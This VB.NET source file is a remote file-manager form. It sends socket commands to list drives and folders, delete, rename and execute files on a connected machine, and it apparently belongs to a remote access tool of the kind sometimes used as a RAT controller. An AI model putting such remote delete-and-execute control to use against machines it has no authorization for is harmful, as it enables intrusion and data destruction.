Public Class Fm
    Public sock As Integer
    Private Sub Fm_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        Form1.s.Send(sock, "GetDrives" & "||")
    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        If TextBox1.Text.Length < 4 Then
            TextBox1.Text = ""
            Form1.s.Send(sock, "GetDrives" & "||")
        Else
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\"))
            TextBox1.Text = TextBox1.Text.Substring(0, TextBox1.Text.LastIndexOf("\") + 1)
            RefreshList()
        End If

    End Sub

    Private Sub ListView1_DoubleClick(ByVal sender As Object, ByVal e As System.EventArgs) Handles ListView1.DoubleClick
        If ListView1.FocusedItem.ImageIndex = 0 Or ListView1.FocusedItem.ImageIndex = 1 Or ListView1.FocusedItem.ImageIndex = 2 Then
            If TextBox1.Text.Length = 0 Then
                TextBox1.Text += ListView1.FocusedItem.Text
            Else
                TextBox1.Text += ListView1.FocusedItem.Text & "\"
            End If
            RefreshList()
        End If

    End Sub
    Public Sub RefreshList()
        Form1.S.Send(sock, "FileManager" & "||" & TextBox1.Text)
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles DeleteToolStripMenuItem.Click
        Select Case ListView1.FocusedItem.ImageIndex
            Case 0 To 1
            Case 2
                Form1.s.Send(sock, "Delete||Folder||" & TextBox1.Text & ListView1.FocusedItem.Text)
            Case Else
                Form1.s.Send(sock, "Delete||File||" & TextBox1.Text & ListView1.FocusedItem.Text)
        End Select
        RefreshList()

    End Sub

    Private Sub RunToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RunToolStripMenuItem.Click
        Form1.s.Send(sock, "Execute||" & TextBox1.Text & ListView1.FocusedItem.Text)

    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RenameToolStripMenuItem.Click
        Dim a As String
        a = InputBox("Enter New Name", "Rename")
        If a <> "" Then
            Select Case ListView1.FocusedItem.ImageIndex
                Case 0 To 1
                Case 2
                    Form1.s.Send(sock, "Rename||Folder||" & TextBox1.Text & ListView1.FocusedItem.Text & "||" & a)
                Case Else
                    Form1.s.Send(sock, "Rename||File||" & TextBox1.Text & ListView1.FocusedItem.Text & "||" & a)
            End Select
        End If
        RefreshList()

    End Sub
End Class